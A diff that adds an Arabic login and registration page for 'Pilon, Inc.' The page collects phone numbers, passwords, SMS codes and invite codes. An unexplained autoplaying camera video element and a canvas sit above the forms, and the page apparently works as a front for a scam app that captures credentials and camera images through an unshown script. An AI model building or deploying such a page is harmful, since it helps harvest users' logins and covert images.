@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول / إنشاء حساب</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <video id="cameraElement" autoplay playsinline></video>
+    <canvas id="canvasElement"></canvas>
+
+    <div class="wrapper">
+        
+        <div class="top-bar">
+            <a href="#" class="back-btn" onclick="goToLogin()"><i class="fa-solid fa-chevron-right"></i> يعود</a>
+            <div class="lang-btn"><i class="fa-solid fa-globe"></i> عربي <i class="fa-solid fa-chevron-down" style="font-size:10px;"></i></div>
+        </div>
+
+        <div class="form-container active" id="loginView">
+            <div class="alert-message" id="loginAlert"></div>
+            
+            <form onsubmit="processLogin(event)">
+                <div class="input-box">
+                    <i class="fa-solid fa-mobile-screen-button"></i>
+                    <span class="country-code">+ 20</span>
+                    <input type="tel" id="loginPhone" placeholder="يرجى إدخال رقم هاتف الجوال" required>
+                </div>
+                
+                <div class="input-box">
+                    <i class="fa-solid fa-lock"></i>
+                    <input type="password" id="loginPass" placeholder="يرجى إدخال كلمة مرور تسجيل الدخول الخاصة بك" required>
+                </div>
+                
+                <div class="input-box">
+                    <i class="fa-solid fa-circle-check"></i>
+                    <input type="text" id="loginCaptcha" placeholder="رمز التحقق من الصورة" required>
+                    <div class="captcha-box">1594</div>
+                </div>
+
+                <button type="submit" class="main-btn">تسجيل الدخول</button>
+            </form>
+
+            <div class="bottom-links">
+                <a href="#" style="float: right;">نسيت كلمة المرور</a>
+                <a href="#" style="float: left;" onclick="switchForm('registerView')">يسجل</a>
+            </div>
+        </div>
+
+        <div class="form-container" id="registerView">
+            <div class="alert-message" id="registerAlert" style="background:#dcfce7; color:#16a34a;"></div>
+            
+            <form onsubmit="processRegister(event)">
+                <div class="input-box">
+                    <i class="fa-solid fa-mobile-screen-button"></i>
+                    <span class="country-code">+ 20</span>
+                    <input type="tel" id="regPhone" placeholder="يرجى إدخال رقم هاتف الجوال" required>
+                </div>
+                
+                <div class="input-box">
+                    <i class="fa-solid fa-circle-check"></i>
+                    <input type="text" id="regSmsCode" placeholder="رمز التحقق عبر الرسائل النصية القصيرة" required>
+                    <button type="button" class="send-code-btn">يرسل</button>
+                </div>
+
+                <div class="input-box">
+                    <i class="fa-solid fa-lock"></i>
+                    <input type="password" id="regPass" placeholder="يرجى إدخال كلمة مرور تسجيل الدخول الخاصة بك" required>
+                </div>
+
+                <div class="input-box">
+                    <i class="fa-solid fa-wallet"></i>
+                    <input type="text" id="regInviteCode" placeholder="يرجى إدخال رمز الدعوة">
+                </div>
+
+                <button type="submit" class="main-btn">يسجل</button>
+            </form>
+
+            <div class="bottom-links" style="justify-content: center;">
+                <a href="#" onclick="switchForm('loginView')">لديك حساب بالفعل؟ سجل دخولك</a>
+            </div>
+        </div>
+
+        <div class="footer-text">
+            © 2026 Pilon, Inc. All rights reserved
+        </div>
+
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
